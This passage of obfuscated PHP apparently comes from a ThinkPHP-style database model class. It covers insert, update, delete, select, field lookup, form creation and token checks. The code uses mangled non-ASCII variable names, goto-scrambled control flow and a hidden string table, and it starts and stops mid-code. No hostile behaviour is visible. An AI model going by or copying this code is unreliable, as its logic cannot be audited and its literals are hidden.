$b’µºÚ³¹‡[182]; $Fäš‡Âæî = $this->db->parseKey($Fäš‡Âæî); return $this->getField(strtoupper($AÀ–…Ö›Øæ) . $b’µºÚ³¹‡[258] . $Fäš‡Âæî . $b’µºÚ³¹‡[259] . $AÀ–…Ö›Øæ, $b’µºÚ³¹‡[253]); } elseif (strtolower(substr($AÀ–…Ö›Øæ, 0, 5)) == $b’µºÚ³¹‡[260]) { $Fäš‡Âæî = think_parse_name(substr($AÀ–…Ö›Øæ, 5)); $A‰óùãÌÑ[$Fäš‡Âæî] = $AëĞ‘•Ì•¶[0]; return $this->where($A‰óùãÌÑ)->find(); } elseif (strtolower(substr($AÀ–…Ö›Øæ, 0, 10)) == $b’µºÚ³¹‡[261]) { $DÌ’²‹åÓë = think_parse_name(substr($AÀ–…Ö›Øæ, 10)); $A‰óùãÌÑ[$DÌ’²‹åÓë] = $AëĞ‘•Ì•¶[0]; return $this->where($A‰óùãÌÑ)->getField($AëĞ‘•Ì•¶[1]); } elseif (isset($this->_scope[$AÀ–…Ö›Øæ])) { return $this->scope($AÀ–…Ö›Øæ, $AëĞ‘•Ì•¶[0]); } elseif (method_exists($this, $AÀ–…Ö›Øæ)) { array_unshift($AëĞ‘•Ì•¶, $AÀ–…Ö›Øæ); return call_user_func_array(array($this, $b’µºÚ³¹‡[262]), $AëĞ‘•Ì•¶); } else { return call_user_func_array(array(parent, $AÀ–…Ö›Øæ), $AëĞ‘•Ì•¶); } } protected function call() { goto C”Å½çØ›ö; d–Ü‚‚Š¸: if (isset($d–ê³ŒŸöë[$C‘Š¤Å¾ÊÇ]) && $d–ê³ŒŸöë[$C‘Š¤Å¾ÊÇ] === $eˆåº”³”ğ) { think_exception(__CLASS__ . $E“ìŒÏœÖÚ[4] . $eˆåº”³”ğ . think_lang($E“ìŒÏœÖÚ[263])); return; } $d–ê³ŒŸöë[] = $eˆåº”³”ğ; if (method_exists($this, $E“ìŒÏœÖÚ[264])) { $f“ô†õë‘Â = call_user_func_array(array($this, $E“ìŒÏœÖÚ[265]), array($aÇÓåÏí, $d–ê³ŒŸöë)); if (!is_null($f“ô†õë‘Â) && $f“ô†õë‘Â !== !1) { return $f“ô†õë‘Â; } } goto aãï¯˜¼¼ª; cä÷°ñÜÚÀ: $aÇÓåÏí = $eˆåº”³”ğ; if (is_array($eˆåº”³”ğ)) { $aÇÓåÏí = $eˆåº”³”ğ[1]; $eˆåº”³”ğ = $eˆåº”³”ğ[0]; } $C‘Š¤Å¾ÊÇ = count($d–ê³ŒŸöë) - 1; goto d–Ü‚‚Š¸; C”Å½çØ›ö: $E“ìŒÏœÖÚ =& $_SERVER[›é¼±]; $d–ê³ŒŸöë = func_get_args(); $eˆåº”³”ğ = array_shift($d–ê³ŒŸöë); goto cä÷°ñÜÚÀ; aãï¯˜¼¼ª: $eÒÜÔµ°Ú© = call_user_func_array(array($this, $eˆåº”³”ğ), $d–ê³ŒŸöë); if (method_exists($this, $E“ìŒÏœÖÚ[266])) { $f“ô†õë‘Â = call_user_func_array(array($this, $E“ìŒÏœÖÚ[267]), array($aÇÓåÏí, $d–ê³ŒŸöë, $eÒÜÔµ°Ú©)); if ($f“ô†õë‘Â) { return $f“ô†õë‘Â; } } return $eÒÜÔµ°Ú©; goto E£ê­‘¸ğÄ; E£ê­‘¸ğÄ: } protected function _initialize() { } protected function _facade($aÈÅŞ·²«ò) { $Eİ·¾±ÇİÌ =& $_SERVER[›é¼±]; if (!empty($this->fields)) { foreach ($aÈÅŞ·²«ò as $Aƒ¹Šœà§ => $c†“¢ÕÂŒÔ) { if (is_array($this->fields) && !in_array($Aƒ¹Šœà§, $this->fields, !0)) { unset($aÈÅŞ·²«ò[$Aƒ¹Šœà§]); } elseif (is_scalar($c†“¢ÕÂŒÔ)) { $this->_parseType($aÈÅŞ·²«ò, $Aƒ¹Šœà§); } } } if (!empty($this->options[$Eİ·¾±ÇİÌ[268]])) { $aÈÅŞ·²«ò = array_map($this->options[$Eİ·¾±ÇİÌ[268]], $aÈÅŞ·²«ò); unset($this->options[$Eİ·¾±ÇİÌ[268]]); } $this->_beforeWrite($aÈÅŞ·²«ò); return $aÈÅŞ·²«ò; } protected function _beforeWrite(&$côÛ«‘³) { } public function add($Bâç¯”Ã­Ì = '', $dâ³÷­¶·Ø = array(), $Fİ‘®Ô¾¹ = false) { goto eğğ¯ˆ¯; fÇ·›¸â£ : if (!1 === $this->_beforeInsert($Bâç¯”Ã­Ì, $dâ³÷­¶·Ø)) { return !1; } $bÙø‰ÙÑÙ‰ = $this->db->insert($Bâç¯”Ã­Ì, $dâ³÷­¶·Ø, $Fİ‘®Ô¾¹); if (!1 !== $bÙø‰ÙÑÙ‰) { $F‡ŒÛÇï´É = $this->getLastInsID(); if ($F‡ŒÛÇï´É) { $Bâç¯”Ã­Ì[$this->getPk()] = $F‡ŒÛÇï´É; $this->_after_insert($Bâç¯”Ã­Ì, $dâ³÷­¶·Ø); return $F‡ŒÛÇï´É; } $this->_after_insert($Bâç¯”Ã­Ì, $dâ³÷­¶·Ø); } goto a˜´‘îÕ§; eğğ¯ˆ¯: if (empty($Bâç¯”Ã­Ì)) { if (!empty($this->data)) { $Bâç¯”Ã­Ì = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[›é¼±][269]); return !1; } } $dâ³÷­¶·Ø = $this->_parseOptions($dâ³÷­¶·Ø); $Bâç¯”Ã­Ì = $this->_facade($Bâç¯”Ã­Ì); goto fÇ·›¸â£ ; a˜´‘îÕ§: return $bÙø‰ÙÑÙ‰; goto E‹—’ä“â­; E‹—’ä“â­: } protected function _beforeInsert(&$CË®¡Õõ, $cÃ¢´˜ÏÑë) { } protected function _after_insert($d›Â ¸‡, $bµ§ĞçùÄÈ) { } public function addAll($B…ïÜÍ”¡Ê, $c‚ÃÉ¤•ß = array(), $aî‘—ŒÎ¡º = false) { goto D‘¸ÜªÉ´; EªçÙ¿À™ : foreach ($B…ïÜÍ”¡Ê as $Eê‡âˆ‹÷¨ => $cËÊåƒâ) { $B…ïÜÍ”¡Ê[$Eê‡âˆ‹÷¨] = $this->_facade($cËÊåƒâ); } if (method_exists($this->db, $fÆœˆÖ½Ò[270])) { $BÆ‚Á’Ï‹† = $this->db->insertAll($B…ïÜÍ”¡Ê, $c‚ÃÉ¤•ß, $aî‘—ŒÎ¡º); } else { $this->startTrans(); foreach ($B…ïÜÍ”¡Ê as $Eê‡âˆ‹÷¨ => $cËÊåƒâ) { $BÆ‚Á’Ï‹† = $this->db->insert($cËÊåƒâ, $c‚ÃÉ¤•ß, $aî‘—ŒÎ¡º); } $this->commit(); } if (!1 !== $BÆ‚Á’Ï‹†) { $BåÙ¡¸‹» = $this->getLastInsID(); if ($BåÙ¡¸‹») { return $BåÙ¡¸‹»; } } goto c–‘²ïù§‚; D‘¸ÜªÉ´: $fÆœˆÖ½Ò =& $_SERVER[›é¼±]; if (empty($B…ïÜÍ”¡Ê)) { $this->error = think_lang($fÆœˆÖ½Ò[269]); return !1; } $c‚ÃÉ¤•ß = $this->_parseOptions($c‚ÃÉ¤•ß); goto EªçÙ¿À™ ; c–‘²ïù§‚: return $BÆ‚Á’Ï‹†; goto aœòÚĞ¡äñ; aœòÚĞ¡äñ: } public function selectAdd($FÓ¶ÄŒ–Ã = '', $fÏÃÌ×Ìù¸ = '', $b„†øŞµˆ– = array()) { $AõİĞè¼¸ =& $_SERVER[›é¼±]; $b„†øŞµˆ– = $this->_parseOptions($b„†øŞµˆ–); if (!1 === ($A²İÒù­Ûò = $this->db->selectInsert($FÓ¶ÄŒ–Ã ? $FÓ¶ÄŒ–Ã : $b„†øŞµˆ–[$AõİĞè¼¸[271]], $fÏÃÌ×Ìù¸ ? $fÏÃÌ×Ìù¸ : $this->getTableName(), $b„†øŞµˆ–))) { $this->error = think_lang($AõİĞè¼¸[272]); return !1; } else { return $A²İÒù­Ûò; } } public function save($a»¬ÎË¤ğ¿ = '', $C®è×‹¾•£ = array()) { goto a¹Ê«¡«î; AÉÛ¼˜áÖË: if (!1 !== $Cæá«À¶Àó) { if (isset($CÎ±íçåò¤)) { $a»¬ÎË¤ğ¿[$FÑì·…Î›‰] = $CÎ±íçåò¤; } $this->_afterUpdate($a»¬ÎË¤ğ¿, $C®è×‹¾•£); } return $Cæá«À¶Àó; goto dùËÌØã›; fƒÔË±¯: if (is_array($C®è×‹¾•£[$d‘”°ô‡“¶[273]]) && isset($C®è×‹¾•£[$d‘”°ô‡“¶[273]][$FÑì·…Î›‰])) { $CÎ±íçåò¤ = $C®è×‹¾•£[$d‘”°ô‡“¶[273]][$FÑì·…Î›‰]; } if (!1 === $this->_beforeUpdate($a»¬ÎË¤ğ¿, $C®è×‹¾•£)) { return !1; } $Cæá«À¶Àó = $this->db->update($a»¬ÎË¤ğ¿, $C®è×‹¾•£); goto AÉÛ¼˜áÖË; a¹Ê«¡«î: $d‘”°ô‡“¶ =& $_SERVER[›é¼±]; if (empty($a»¬ÎË¤ğ¿)) { if (!empty($this->data)) { $a»¬ÎË¤ğ¿ = $this->data; $this->data = array(); } else { $this->error = think_lang($d‘”°ô‡“¶[269]); return !1; } } $a»¬ÎË¤ğ¿ = $this->_facade($a»¬ÎË¤ğ¿); goto c¸¡õÔÛÈ‡; c¸¡õÔÛÈ‡: $C®è×‹¾•£ = $this->_parseOptions($C®è×‹¾•£); $FÑì·…Î›‰ = $this->getPk(); if (!isset($C®è×‹¾•£[$d‘”°ô‡“¶[273]])) { if (isset($a»¬ÎË¤ğ¿[$FÑì·…Î›‰])) { $A‰¢ºì²Ş[$FÑì·…Î›‰] = $a»¬ÎË¤ğ¿[$FÑì·…Î›‰]; $C®è×‹¾•£[$d‘”°ô‡“¶[273]] = $A‰¢ºì²Ş; unset($a»¬ÎË¤ğ¿[$FÑì·…Î›‰]); } else { $this->error = think_lang($d‘”°ô‡“¶[272]); return !1; } } goto fƒÔË±¯; dùËÌØã›: } protected function _beforeUpdate(&$a‡¼ˆÆƒ¢š, $bŒ†æÈç¶Î) { } protected function _afterUpdate($bè„„ä²Œæ, $bâ¸¤‘Ê˜) { } public function delete($d•ÊÀÅ¾Í‹ = array()) { goto dæƒ‹¶£†; Cµù¹ä®’æ: $CÑôÑÇÄºé = $this->db->delete($d•ÊÀÅ¾Í‹); if (!1 !== $CÑôÑÇÄºé) { $e£í³Ÿ‚˜ = array(); if (isset($E¹¾×á”¢”)) { $e£í³Ÿ‚˜[$bŞàÅÉè­Š] = $E¹¾×á”¢”; } $this->_after_delete($e£í³Ÿ‚˜, $d•ÊÀÅ¾Í‹); } return $CÑôÑÇÄºé; goto AóÉ”ôÉß; dæƒ‹¶£†: $B–ö»òªˆ÷ =& $_SERVER[›é¼±]; if (empty($d•ÊÀÅ¾Í‹) && empty($this->options[$B–ö»òªˆ÷[273]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $bŞàÅÉè­Š = $this->getPk(); goto F§Ó†‰ˆ“; F§Ó†‰ˆ“: if (is_numeric($d•ÊÀÅ¾Í‹) || is_string($d•ÊÀÅ¾Í‹)) { if (strpos($d•ÊÀÅ¾Í‹, $B–ö»òªˆ÷[47])) { $b¿Æ¿ğõ‘”[$bŞàÅÉè­Š] = array($B–ö»òªˆ÷[274], $d•ÊÀÅ¾Í‹); } else { $b¿Æ¿ğõ‘”[$bŞàÅÉè­Š] = $d•ÊÀÅ¾Í‹; } $this->options[$B–ö»òªˆ÷[273]] = $b¿Æ¿ğõ‘”; } $d•ÊÀÅ¾Í‹ = $this->_parseOptions(); if (is_array($d•ÊÀÅ¾Í‹[$B–ö»òªˆ÷[273]]) && isset($d•ÊÀÅ¾Í‹[$B–ö»òªˆ÷[273]][$bŞàÅÉè­Š])) { $E¹¾×á”¢” = $d•ÊÀÅ¾Í‹[$B–ö»òªˆ÷[273]][$bŞàÅÉè­Š]; } goto Cµù¹ä®’æ; AóÉ”ôÉß: } protected function _after_delete($C‹âÎÑ‡Ñ‰, $d®ã¥È‘ì) { } public function select($d¡’ğ´ÖÈ = array()) { goto c†á‹ë¬©°; d†ä ç›¯í: $this->_afterSelect($Fğ¼éõ«…, $d¡’ğ´ÖÈ); return $Fğ¼éõ«…; goto F…‡ê©§í; b¢è¥é°­‡: $Fğ¼éõ«… = $this->db->select($d¡’ğ´ÖÈ); if (!1 === $Fğ¼éõ«…) { return !1; } if (empty($Fğ¼éõ«…)) { return null; } goto d†ä ç›¯í; c†á‹ë¬©°: $Cá­æˆ¹Ê‡ =& $_SERVER[›é¼±]; if (is_string($d¡’ğ´ÖÈ) || is_numeric($d¡’ğ´ÖÈ)) { $bó–ß‚‡ä = $this->getPk(); if (strpos($d¡’ğ´ÖÈ, $Cá­æˆ¹Ê‡[47])) { $e¢çª¯‡Èî[$bó–ß‚‡ä] = array($Cá­æˆ¹Ê‡[274], $d¡’ğ´ÖÈ); } else { $e¢çª¯‡Èî[$bó–ß‚‡ä] = $d¡’ğ´ÖÈ; } $this->options[$Cá­æˆ¹Ê‡[273]] = $e¢çª¯‡Èî; } elseif (!1 === $d¡’ğ´ÖÈ) { $d¡’ğ´ÖÈ = $this->_parseOptions(); return $Cá­æˆ¹Ê‡[275] . $this->db->buildSelectSql($d¡’ğ´ÖÈ) . $Cá­æˆ¹Ê‡[276]; } $d¡’ğ´ÖÈ = $this->_parseOptions(); goto b¢è¥é°­‡; F…‡ê©§í: } protected function _afterSelect(&$e ÏîóÜ¡, $ağ¤‘²‰Ì) { } public function buildSql($aïÑè¨ˆ®¥ = array()) { $bÃÜ‡À¤Â =& $_SERVER[›é¼±]; $aïÑè¨ˆ®¥ = $this->_parseOptions($aïÑè¨ˆ®¥); return $bÃÜ‡À¤Â[275] . $this->db->buildSelectSql($aïÑè¨ˆ®¥) . $bÃÜ‡À¤Â[276]; } public function optionsValue($F°óÓè»ºİ = null) { if (is_null($F°óÓè»ºİ)) { return $this->options; } elseif (is_array($F°óÓè»ºİ)) { $this->options = array_merge($this->options, $F°óÓè»ºİ); } } protected function _parseOptions($EÒà™ÇÒÀ‡ = array()) { goto a¬øŒÀöğ†; DŒ—ª–ÔÈ¦: if (!isset($EÒà™ÇÒÀ‡[$EÃ‡»²–²[277]])) { $EÒà™ÇÒÀ‡[$EÃ‡»²–²[277]] = $this->getTableName(); $BÒ³¾¾²¦ = $this->fields; } else { $BÒ³¾¾²¦ = $this->getDbFields(); } if (!empty($EÒà™ÇÒÀ‡[$EÃ‡»²–²[278]])) { $EÒà™ÇÒÀ‡[$EÃ‡»²–²[277]] .= $EÃ‡»²–²[50] . $EÒà™ÇÒÀ‡[$EÃ‡»²–²[278]]; } $EÒà™ÇÒÀ‡[$EÃ‡»²–²[279]] = $this->name; goto B °½ãÏì…; B °½ãÏì…: if (isset($EÒà™ÇÒÀ‡[$EÃ‡»²–²[273]]) && is_array($EÒà™ÇÒÀ‡[$EÃ‡»²–²[273]]) && !empty($BÒ³¾¾²¦) && !isset($EÒà™ÇÒÀ‡[$EÃ‡»²–²[280]]) && !isset($EÒà™ÇÒÀ‡[$EÃ‡»²–²[277]])) { foreach ($EÒà™ÇÒÀ‡[$EÃ‡»²–²[273]] as $BíĞõŞñø => $d š‘®îÃµ) { $BíĞõŞñø = trim($BíĞõŞñø); if (in_array($BíĞõŞñø, $BÒ³¾¾²¦, !0)) { if (is_scalar($d š‘®îÃµ)) { $this->_parseType($EÒà™ÇÒÀ‡[$EÃ‡»²–²[273]], $BíĞõŞñø); } } elseif (!is_numeric($BíĞõŞñø) && $EÃ‡»²–²[71] != substr($BíĞõŞñø, 0, 1) && !1 === strpos($BíĞõŞñø, $EÃ‡»²–²[95]) && !1 === strpos($BíĞõŞñø, $EÃ‡»²–²[258]) && !1 === strpos($BíĞõŞñø, $EÃ‡»²–²[281]) && !1 === strpos($BíĞõŞñø, $EÃ‡»²–²[282])) { unset($EÒà™ÇÒÀ‡[$EÃ‡»²–²[273]][$BíĞõŞñø]); } } } $this->_options_filter($EÒà™ÇÒÀ‡); return $EÒà™ÇÒÀ‡; goto E…°÷Û±ù; a¬øŒÀöğ†: $EÃ‡»²–² =& $_SERVER[›é¼±]; if (is_array($EÒà™ÇÒÀ‡)) { $EÒà™ÇÒÀ‡ = array_merge($this->options, $EÒà™ÇÒÀ‡); } $this->options = array(); goto DŒ—ª–ÔÈ¦; E…°÷Û±ù: } protected function _options_filter(&$eó†‰˜«††) { } protected function _parseType(&$aê‹ì‘, $Eåµã„­‹á) { $FõÀ§«íå =& $_SERVER[›é¼±]; if (empty($this->options[$FõÀ§«íå[283]][$FõÀ§«íå[4] . $Eåµã„­‹á])) { $CÂ‡»¥º·´ = strtolower($this->fields[$FõÀ§«íå[250]][$Eåµã„­‹á]); if (!1 !== strpos($CÂ‡»¥º·´, $FõÀ§«íå[284])) { } elseif (!1 === strpos($CÂ‡»¥º·´, $FõÀ§«íå[285]) && !1 !== strpos($CÂ‡»¥º·´, $FõÀ§«íå[286])) { $aê‹ì‘[$Eåµã„­‹á] = intval($aê‹ì‘[$Eåµã„­‹á]); } elseif (!1 !== strpos($CÂ‡»¥º·´, $FõÀ§«íå[287]) || !1 !== strpos($CÂ‡»¥º·´, $FõÀ§«íå[288])) { $aê‹ì‘[$Eåµã„­‹á] = floatval($aê‹ì‘[$Eåµã„­‹á]); } elseif (!1 !== strpos($CÂ‡»¥º·´, $FõÀ§«íå[289])) { $aê‹ì‘[$Eåµã„­‹á] = (bool) $aê‹ì‘[$Eåµã„­‹á]; } } } public function find($C”…•òÙá = array()) { goto eåÅÏ‚Åİ; eåÅÏ‚Åİ: $aĞ°¹Ã‡ë¶ =& $_SERVER[›é¼±]; if (is_numeric($C”…•òÙá) || is_string($C”…•òÙá)) { $c¢ñ…—òÂ[$this->getPk()] = intval($C”…•òÙá); $this->options[$aĞ°¹Ã‡ë¶[273]] = $c¢ñ…—òÂ; } $this->options[$aĞ°¹Ã‡ë¶[290]] = 1; goto dâ™»âÖê§; e‰‚åÂ¾: if (empty($EŸË•¾†âœ)) { return null; } $this->data = $EŸË•¾†âœ[0]; $this->_afterFind($this->data, $C”…•òÙá); goto C×å¸ÍØ‘´; C×å¸ÍØ‘´: if (!empty($this->options[$aĞ°¹Ã‡ë¶[291]])) { return $this->returnResult($this->data, $this->options[$aĞ°¹Ã‡ë¶[291]]); } return $this->data; goto f–œæ‚ª; dâ™»âÖê§: $C”…•òÙá = $this->_parseOptions(); $EŸË•¾†âœ = $this->db->select($C”…•òÙá); if (!1 === $EŸË•¾†âœ) { return !1; } goto e‰‚åÂ¾; f–œæ‚ª: } protected function _afterFind(&$Bøò„«äôÁ, $b‘Œ¦å´×) { } protected function returnResult($b†£µ‹İìø, $FÁÆö±¥¢ƒ = '') { $AÒ§èöåÁ¸ =& $_SERVER[›é¼±]; if ($FÁÆö±¥¢ƒ) { if (is_callable($FÁÆö±¥¢ƒ)) { return call_user_func($FÁÆö±¥¢ƒ, $b†£µ‹İìø); } switch (strtolower($FÁÆö±¥¢ƒ)) { case $AÒ§èöåÁ¸[292]: return json_encode($b†£µ‹İìø); case $AÒ§èöåÁ¸[293]: return xml_encode($b†£µ‹İìø); } } return $b†£µ‹İìø; } public function parseFieldsMap($b´âà½Šì, $BÒ‚ê¤¶¸« = 1) { if (!empty($this->_map)) { foreach ($this->_map as $cÖªò¨ÙÍ¦ => $Eİ÷¯àÛƒ‡) { if ($BÒ‚ê¤¶¸« == 1) { if (isset($b´âà½Šì[$Eİ÷¯àÛƒ‡])) { $b´âà½Šì[$cÖªò¨ÙÍ¦] = $b´âà½Šì[$Eİ÷¯àÛƒ‡]; unset($b´âà½Šì[$Eİ÷¯àÛƒ‡]); } } else { if (isset($b´âà½Šì[$cÖªò¨ÙÍ¦])) { $b´âà½Šì[$Eİ÷¯àÛƒ‡] = $b´âà½Šì[$cÖªò¨ÙÍ¦]; unset($b´âà½Šì[$cÖªò¨ÙÍ¦]); } } } } return $b´âà½Šì; } public function setField($Døğ¢õ‡Œ´, $AóÃœ‚é‰š = '') { if (is_array($Døğ¢õ‡Œ´)) { $B«‘è¢¬¼ = $Døğ¢õ‡Œ´; } else { $B«‘è¢¬¼[$Døğ¢õ‡Œ´] = $AóÃœ‚é‰š; } return $this->save($B«‘è¢¬¼); } public function setAdd($EØò‹Œç‰ä, $Eâ Íõø´ = 1) { $DÇµŠœ‰Ó± =& $_SERVER[›é¼±]; $BÑÌàç–±ƒ = $EØò‹Œç‰ä . $DÇµŠœ‰Ó±[294] . $Eâ Íõø´; if ($Eâ Íõø´ < 0) { $BÑÌàç–±ƒ = $EØò‹Œç‰ä . $Eâ Íõø´; } return $this->setField($EØò‹Œç‰ä, array($DÇµŠœ‰Ó±[295], $BÑÌàç–±ƒ)); } public function getField($a†ÎööØÅ¸, $d¼•µ¸ƒÕ = null) { $C›šÄ²éÅ =& $_SERVER[›é¼±]; $F‘ØÌõ…ø³[$C›šÄ²éÅ[271]] = $a†ÎööØÅ¸; $F‘ØÌõ…ø³ = $this->_parseOptions($F‘ØÌõ…ø³); $a†ÎööØÅ¸ = trim($a†ÎööØÅ¸); if (strpos($a†ÎööØÅ¸, $C›šÄ²éÅ[47])) { if (!isset($F‘ØÌõ…ø³[$C›šÄ²éÅ[290]])) { $F‘ØÌõ…ø³[$C›šÄ²éÅ[290]] = is_numeric($d¼•µ¸ƒÕ) ? $d¼•µ¸ƒÕ : $C›šÄ²éÅ[33]; } $a¥’çé¯Ÿ­ = $this->db->select($F‘ØÌõ…ø³); if (!empty($a¥’çé¯Ÿ­)) { goto aÂ— ¾‹Ù; aÂ— ¾‹Ù: $BÃ”ó§Ó‰’ = explode($C›šÄ²éÅ[47], $a†ÎööØÅ¸); $a†ÎööØÅ¸ = array_keys($a¥’çé¯Ÿ­[0]); $a’©‡¾¦½« = array_shift($a†ÎööØÅ¸); goto CèŒ¢¿˜“; CèŒ¢¿˜“: $f‰éÓíÛŸ¯ = array_shift($a†ÎööØÅ¸); $Fîùçóİ½ = array(); $e—ôåÎáùÂ = count($BÃ”ó§Ó‰’); goto E¥ÚŠÍ›«È; E¥ÚŠÍ›«È: foreach ($a¥’çé¯Ÿ­ as $b¦æóÏŠÆİ) { $A«òÓ¼‡¾Œ = $b¦æóÏŠÆİ[$a’©‡¾¦½«]; if (2 == $e—ôåÎáùÂ) { $Fîùçóİ½[$A«òÓ¼‡¾Œ] = $b¦æóÏŠÆİ[$f‰éÓíÛŸ¯]; } else { $Fîùçóİ½[$A«òÓ¼‡¾Œ] = is_string($d¼•µ¸ƒÕ) ? implode($d¼•µ¸ƒÕ, $b¦æóÏŠÆİ) : $b¦æóÏŠÆİ; } } return $Fîùçóİ½; goto eãÑ½Ğ‚óˆ; eãÑ½Ğ‚óˆ: } } else { if (!0 !== $d¼•µ¸ƒÕ) { $F‘ØÌõ…ø³[$C›šÄ²éÅ[290]] = is_numeric($d¼•µ¸ƒÕ) ? $d¼•µ¸ƒÕ : 1; } if ($d¼•µ¸ƒÕ === $C›šÄ²éÅ[253]) { unset($F‘ØÌõ…ø³[$C›šÄ²éÅ[290]]); } $b¦æóÏŠÆİ = $this->db->select($F‘ØÌõ…ø³); if (!empty($b¦æóÏŠÆİ)) { if ($d¼•µ¸ƒÕ === $C›šÄ²éÅ[253]) { return reset($b¦æóÏŠÆİ[0]); } if (!0 !== $d¼•µ¸ƒÕ && 1 == $F‘ØÌõ…ø³[$C›šÄ²éÅ[290]]) { return reset($b¦æóÏŠÆİ[0]); } foreach ($b¦æóÏŠÆİ as $cŞƒöõæ´Ô) { $bôÔ™ÔÚãÃ[] = $cŞƒöõæ´Ô[$a†ÎööØÅ¸]; } return $bôÔ™ÔÚãÃ; } } return null; } public function create($Cí‰ô‘“÷ò = '', $EŞ¢ÖÊ«ñÓ = '') { goto dˆŠØ‘çÅ; dˆŠØ‘çÅ: $a§­Ù¼ ‹¡ =& $_SERVER[›é¼±]; if (empty($Cí‰ô‘“÷ò)) { $Cí‰ô‘“÷ò = $_POST; } elseif (is_object($Cí‰ô‘“÷ò)) { $Cí‰ô‘“÷ò = get_object_vars($Cí‰ô‘“÷ò); } if (empty($Cí‰ô‘“÷ò) || !is_array($Cí‰ô‘“÷ò)) { $this->error = think_lang($a§­Ù¼ ‹¡[269]); return !1; } goto eô”©•¹á; eô”©•¹á: $Cí‰ô‘“÷ò = $this->parseFieldsMap($Cí‰ô‘“÷ò, 0); $EŞ¢ÖÊ«ñÓ = $EŞ¢ÖÊ«ñÓ ? $EŞ¢ÖÊ«ñÓ : (!empty($Cí‰ô‘“÷ò[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$a§­Ù¼ ‹¡[271]])) { $cÇ‡Š•¢˜ = $this->options[$a§­Ù¼ ‹¡[271]]; unset($this->options[$a§­Ù¼ ‹¡[271]]); } elseif ($EŞ¢ÖÊ«ñÓ == THINK_MODEL_INSERT && isset($this->insertFields)) { $cÇ‡Š•¢˜ = $this->insertFields; } elseif ($EŞ¢ÖÊ«ñÓ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $cÇ‡Š•¢˜ = $this->updateFields; } goto fÄõÎÑïÌµ; fÄõÎÑïÌµ: if (isset($cÇ‡Š•¢˜)) { if (is_string($cÇ‡Š•¢˜)) { $cÇ‡Š•¢˜ = explode($a§­Ù¼ ‹¡[47], $cÇ‡Š•¢˜); } if (think_config($a§­Ù¼ ‹¡[296])) { $cÇ‡Š•¢˜[] = think_config($a§­Ù¼ ‹¡[297]); } foreach ($Cí‰ô‘“÷ò as $eé÷ƒÚ“¾º => $AŠí‹ÅôÔÍ) { if (!in_array($eé÷ƒÚ“¾º, $cÇ‡Š•¢˜)) { unset($Cí‰ô‘“÷ò[$eé÷ƒÚ“¾º]); } } } if (!$this->autoValidation($Cí‰ô‘“÷ò, $EŞ¢ÖÊ«ñÓ)) { return !1; } if (!$this->autoCheckToken($Cí‰ô‘“÷ò)) { $this->error = think_lang($a§­Ù¼ ‹¡[298]); return !1; } goto aËçÙâ¸ƒƒ; c©Â»óÆĞÆ: return $Cí‰ô‘“÷ò; goto E‘“Æš§íœ; aËçÙâ¸ƒƒ: if ($this->autoCheckFields) { $cÇ‡Š•¢˜ = $this->getDbFields(); foreach ($Cí‰ô‘“÷ò as $eé÷ƒÚ“¾º => $AŠí‹ÅôÔÍ) { if (!in_array($eé÷ƒÚ“¾º, $cÇ‡Š•¢˜)) { unset($Cí‰ô‘“÷ò[$eé÷ƒÚ“¾º]); } elseif (MAGIC_QUOTES_GPC && is_string($AŠí‹ÅôÔÍ)) { $Cí‰ô‘“÷ò[$eé÷ƒÚ“¾º] = stripslashes($AŠí‹ÅôÔÍ); } } } $this->autoOperation($Cí‰ô‘“÷ò, $EŞ¢ÖÊ«ñÓ); $this->data = $Cí‰ô‘“÷ò; goto c©Â»óÆĞÆ; E‘“Æš§íœ: } public function autoCheckToken($fÍ›¼à³—) { $dñ”ÍøÊåğ =& $_SERVER[›é¼±]; if (isset($this->options[$dñ”ÍøÊåğ[299]]) && !$this->options[$dñ”ÍøÊåğ[299]]) { return !0; } if (think_config($dñ”ÍøÊåğ[296])) { $f‘àœâ˜ = think_config($dñ”ÍøÊåğ[297]); if (!isset($fÍ›¼à³—[$f‘àœâ˜]) || Session::get($f‘àœâ˜)) { return !1; } list($CŞô’”µõ©, $Cï©ØîÈ‹) = explode($dñ”ÍøÊåğ[71], $fÍ›¼à³—[$f‘àœâ˜]); if ($Cï©ØîÈ‹ && Session::get($f‘àœâ˜ . $dñ”ÍøÊåğ[95] . $CŞô’”µõ©) === $Cï©ØîÈ‹) { Session::remove($f‘àœâ˜ . $dñ”ÍøÊåğ[95] . $CŞô’”µõ©); return !0; } if (think_config($dñ”ÍøÊåğ[300])) { Session::remove($f‘àœâ˜ . $dñ”ÍøÊåğ[95] . $CŞô’”µõ©); } return !1; } return !0; } public function regex($dÂ¡Á¬ÀåÑ, $A°¡¶Ş¨æ) { $CÈé§¾¬á• =& $_SERVER[›é¼±]; $d¦¯×àÅÃ¡ = array($CÈé§¾¬á•[301] => $CÈé§¾¬á•[302], $CÈé§¾¬á•[303] => $CÈé§¾¬á•[304], $CÈé§¾¬á•[305] => $CÈé§¾¬á•[306], $CÈé§¾¬á•[307] => $CÈé§¾¬á•[308], $CÈé§¾¬á•[309] => $CÈé§¾¬á•[310], $CÈé§¾¬á•[311] => $CÈé§¾¬á•[312], $CÈé§¾¬á•[313] => $CÈé§¾¬á•[314], $CÈé§¾¬á•[288] => $CÈé§¾¬á•[315], $CÈé§¾¬á•[316] => $CÈé§¾¬á•[317]); if (isset($d¦¯×àÅÃ¡[strtolower($A°¡¶Ş¨æ)])) { $A°¡¶Ş¨æ = $d¦¯×àÅÃ¡[strtolower($A°¡¶Ş¨æ)]; } return preg_match($A°¡¶Ş¨æ, $dÂ¡Á¬ÀåÑ) === 1; } private function autoOperation(&$D›’˜ÒåğÍ, $E÷±¿Äï¢) { $D»Øíë›Ñ¸ =& $_SERVER[›é¼±]; if (!empty($this->options[$D»Øíë›Ñ¸[318]])) { $dÀÈñ‹½‘Í = $this->options[$D»Øíë›Ñ¸[318]]; unset($this->options[$D»Øíë›Ñ¸[318]]); } elseif (!empty($this->_auto)) { $dÀÈñ‹½‘Í = $this->_auto; } if (isset($dÀÈñ‹½‘Í)) { foreach ($dÀÈñ‹½‘Í as $AÅÖÛŒ¨Ö) { if (empty($AÅÖÛŒ¨Ö[2])) { $AÅÖÛŒ¨Ö[2] = THINK_MODEL_INSERT; } if ($E÷±¿Äï¢ == $AÅÖÛŒ¨Ö[2] || $AÅÖÛŒ¨Ö[2] == THINK_MODEL_BOTH) { switch 